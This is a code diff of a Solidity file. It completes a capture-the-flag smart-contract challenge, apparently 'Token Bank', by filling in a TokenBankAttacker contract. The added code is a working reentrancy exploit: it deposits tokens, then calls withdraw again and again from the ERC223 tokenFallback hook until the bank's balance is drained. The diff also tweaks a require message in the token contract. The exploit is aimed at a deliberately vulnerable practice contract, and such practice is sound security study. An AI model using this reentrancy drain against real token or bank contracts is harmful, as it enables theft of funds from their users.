@@ -79,7 +79,7 @@ contract SimpleERC223Token {
         address to,
         uint256 value
     ) public returns (bool success) {
-        require(value <= balanceOf[from]);
+        require(value <= balanceOf[from],"balance not enough");
         require(value <= allowance[from][msg.sender]);
 
         balanceOf[from] -= value;
@@ -130,11 +130,48 @@ contract TokenBankChallenge {
 }
 
 // Write your exploit contract below
-contract TokenBankAttacker {
+contract TokenBankAttacker is ITokenReceiver {
     TokenBankChallenge public challenge;
+    SimpleERC223Token public token;
+    uint256 public constant AMOUNT = 500000 * 10**18;
+     bool public attacking = false;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        token = challenge.token();
     }
     // Write your exploit functions here
+    function attack() public {
+        // First, transfer the attacker's tokens to the challenge contract
+        token.transfer(address(challenge), AMOUNT);
+        
+        // Then start the withdrawal process
+        attacking = true;
+        challenge.withdraw(AMOUNT);
+        
+        // After the attack, transfer any remaining tokens back to the player
+        uint256 remainingBalance = token.balanceOf(address(this));
+        if (remainingBalance > 0) {
+            token.transfer(msg.sender, remainingBalance);
+        }
+    }
+
+    function tokenFallback(address from, uint256 value, bytes memory) public override {
+        require(msg.sender == address(token), "Only accept tokens from the official token contract");
+        
+        if (attacking) {
+            uint256 challengeBalance = token.balanceOf(address(challenge));
+            if (challengeBalance > 0) {
+                // Withdraw the minimum of the challenge's balance or our recorded balance
+                uint256 amount = challengeBalance < AMOUNT ? challengeBalance : AMOUNT;
+                challenge.withdraw(amount);
+            } else {
+                attacking = false;
+            }
+        }
+    }
+
+    // Allow the contract to receive Ether
+    receive() external payable {}
+
 }
